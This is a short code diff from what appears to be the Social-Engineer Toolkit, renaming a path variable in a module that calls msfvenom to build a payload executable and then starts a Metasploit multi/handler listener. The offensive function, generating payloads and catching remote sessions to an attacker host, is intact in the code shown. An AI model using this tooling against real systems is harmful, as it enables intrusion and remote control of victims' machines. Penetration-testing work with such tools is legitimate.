@@ -16,14 +16,14 @@ meta_path = meta_path()
 def payload_generate(payload, lhost, port):
     # generate metasploit
     subprocess.Popen(meta_path + "msfvenom -p %s LHOST=%s LPORT=%s --format=exe > %s/payload.exe" %
-                     (payload, lhost, port, setdir), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True).wait()
+                     (payload, lhost, port, userconfigpath), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True).wait()
     # write out the rc file
-    filewrite = open(setdir + "/meta_config", "w")
+    filewrite = open(userconfigpath + "meta_config", "w")
     filewrite.write(
         "use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\r\n\r\n" % (payload, lhost, port))
     filewrite.close()
     print_status(
-        "Payload has been exported to the default SET directory located under: " + setdir + "/payload.exe")
+        "Payload has been exported to the default SET directory located under: " + userconfigpath + "payload.exe")
 
 show_payload_menu2 = create_menu(payload_menu_2_text, payload_menu_2)
 payload = (raw_input(setprompt(["4"], "")))
@@ -49,4 +49,4 @@ if check_options("INFECTION_MEDIA=") != "ON":
         print_status(
             "Launching msfconsole, this could take a few to load. Be patient...")
         subprocess.Popen(meta_path + "msfconsole -r " +
-                         setdir + "/meta_config", shell=True).wait()
+                         userconfigpath + "meta_config", shell=True).wait()
